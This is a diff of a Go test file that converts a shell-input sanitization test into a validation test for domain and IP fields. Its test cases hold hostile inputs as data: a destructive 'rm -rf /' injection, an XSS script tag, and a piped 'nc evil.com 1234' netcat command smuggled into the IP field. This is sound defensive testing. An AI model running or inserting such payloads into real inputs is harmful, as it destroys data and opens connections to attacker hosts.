@@ -453,70 +453,83 @@ func TestAPISecurityHeaders(t *testing.T) {
 	}
 }
 
-func TestAPIInputSanitization(t *testing.T) {
+func TestAPIInputValidation(t *testing.T) {
 	tests := []struct {
 		name     string
 		input    map[string]interface{}
-		expected map[string]interface{}
+		expectValid bool
 	}{
 		{
-			name: "Normal input",
+			name: "Valid input",
 			input: map[string]interface{}{
 				"domain": "example.com",
 				"ip":     "192.168.1.100",
 			},
-			expected: map[string]interface{}{
-				"domain": "example.com",
-				"ip":     "192.168.1.100",
-			},
+			expectValid: true,
 		},
 		{
-			name: "Input with dangerous characters",
+			name: "Input with shell injection in domain",
 			input: map[string]interface{}{
 				"domain": "example.com; rm -rf /",
 				"ip":     "192.168.1.100",
 			},
-			expected: map[string]interface{}{
-				"domain": "example.com rm -rf ",
-				"ip":     "192.168.1.100",
-			},
+			expectValid: false,
 		},
 		{
-			name: "XSS attempt",
+			name: "XSS attempt in domain",
 			input: map[string]interface{}{
 				"domain": "<script>alert('xss')</script>",
 				"ip":     "192.168.1.100",
 			},
-			expected: map[string]interface{}{
-				"domain": "scriptalert('xss')/script",
-				"ip":     "192.168.1.100",
+			expectValid: false,
+		},
+		{
+			name: "Command injection in IP",
+			input: map[string]interface{}{
+				"domain": "example.com",
+				"ip":     "192.168.1.100|nc evil.com 1234",
 			},
+			expectValid: false,
+		},
+		{
+			name: "Invalid IP format",
+			input: map[string]interface{}{
+				"domain": "example.com",
+				"ip":     "999.999.999.999",
+			},
+			expectValid: false,
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			// Simple sanitization function
-			sanitize := func(input string) string {
-				return sanitizeForShell(input)
-			}
-
-			// Apply sanitization
-			result := make(map[string]interface{})
+			// Validate each input
+			hasValidationErrors := false
+			
 			for key, value := range tt.input {
 				if str, ok := value.(string); ok {
-					result[key] = sanitize(str)
-				} else {
-					result[key] = value
+					var inputType string
+					switch key {
+					case "domain":
+						inputType = "domain"
+					case "ip":
+						inputType = "ip"
+					default:
+						continue // Skip unknown keys
+					}
+					
+					if err := validateForShellExecution(str, inputType); err != nil {
+						hasValidationErrors = true
+						t.Logf("Validation error for %s: %v", key, err)
+					}
 				}
 			}
 
-			// Check sanitized values
-			for key, expectedValue := range tt.expected {
-				if result[key] != expectedValue {
-					t.Errorf("Sanitization failed for %s: expected %v, got %v", 
-						key, expectedValue, result[key])
-				}
+			// Check if validation result matches expectation
+			if tt.expectValid && hasValidationErrors {
+				t.Errorf("Expected valid input but validation failed")
+			} else if !tt.expectValid && !hasValidationErrors {
+				t.Errorf("Expected validation errors for malicious input but validation passed")
 			}
 		})
 	}
